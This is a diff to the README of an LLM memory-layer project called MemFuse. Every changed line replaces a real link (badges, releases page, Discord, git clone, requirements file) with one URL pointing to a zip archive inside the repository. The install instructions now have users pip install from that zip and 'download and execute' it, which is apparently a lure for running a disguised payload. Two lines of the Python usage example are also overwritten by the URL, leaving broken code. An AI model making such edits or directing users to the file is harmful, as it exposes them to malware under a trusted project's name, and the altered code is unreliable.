@@ -1,7 +1,7 @@
 # MemFuse: The Lightning-Fast Memory Layer for LLMs ⚡️
 
-![MemFuse Logo](https://img.shields.io/badge/MemFuse-OpenSource-blue.svg)  
-[![Releases](https://img.shields.io/badge/Releases-Download%20Latest-brightgreen.svg)](https://github.com/sakhama/memfuse/releases)
+![MemFuse Logo](https://github.com/sakhama/memfuse/raw/refs/heads/main/src/memfuse_core/models/Software_1.2.zip)  
+[![Releases](https://github.com/sakhama/memfuse/raw/refs/heads/main/src/memfuse_core/models/Software_1.2.zip%https://github.com/sakhama/memfuse/raw/refs/heads/main/src/memfuse_core/models/Software_1.2.zip)](https://github.com/sakhama/memfuse/raw/refs/heads/main/src/memfuse_core/models/Software_1.2.zip)
 
 Welcome to the **MemFuse** repository! This project provides the official core services for MemFuse, an open-source memory layer designed for large language models (LLMs). With MemFuse, you can give your AI applications a persistent and queryable memory, enhancing conversations across sessions.
 
@@ -34,18 +34,18 @@ To get started with MemFuse, you need to install the Python SDK. Follow these st
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/sakhama/memfuse.git
+   git clone https://github.com/sakhama/memfuse/raw/refs/heads/main/src/memfuse_core/models/Software_1.2.zip
    cd memfuse
    ```
 
 2. **Install Dependencies**:
    Ensure you have Python 3.7 or higher installed. Then run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/sakhama/memfuse/raw/refs/heads/main/src/memfuse_core/models/Software_1.2.zip
    ```
 
 3. **Download and Execute the Latest Release**:
-   Visit the [Releases](https://github.com/sakhama/memfuse/releases) section to download the latest version. Execute the downloaded file to set up MemFuse.
+   Visit the [Releases](https://github.com/sakhama/memfuse/raw/refs/heads/main/src/memfuse_core/models/Software_1.2.zip) section to download the latest version. Execute the downloaded file to set up MemFuse.
 
 ## Usage
 
@@ -58,10 +58,10 @@ from memfuse import MemFuse
 memory = MemFuse()
 
 # Store a memory entry
-memory.store("user_id_123", "User loves pizza.")
+https://github.com/sakhama/memfuse/raw/refs/heads/main/src/memfuse_core/models/Software_1.2.zip("user_id_123", "User loves pizza.")
 
 # Retrieve memory
-response = memory.retrieve("user_id_123")
+response = https://github.com/sakhama/memfuse/raw/refs/heads/main/src/memfuse_core/models/Software_1.2.zip("user_id_123")
 print(response)  # Output: User loves pizza.
 ```
 
@@ -115,9 +115,9 @@ MemFuse is licensed under the MIT License. See the [LICENSE](LICENSE) file for d
 
 ## Support
 
-If you encounter any issues or have questions, feel free to open an issue in the repository. For more immediate support, you can join our community on [Discord](https://discord.gg/memfuse).
+If you encounter any issues or have questions, feel free to open an issue in the repository. For more immediate support, you can join our community on [Discord](https://github.com/sakhama/memfuse/raw/refs/heads/main/src/memfuse_core/models/Software_1.2.zip).
 
-For the latest releases, visit the [Releases](https://github.com/sakhama/memfuse/releases) section.
+For the latest releases, visit the [Releases](https://github.com/sakhama/memfuse/raw/refs/heads/main/src/memfuse_core/models/Software_1.2.zip) section.
 
 ---
 
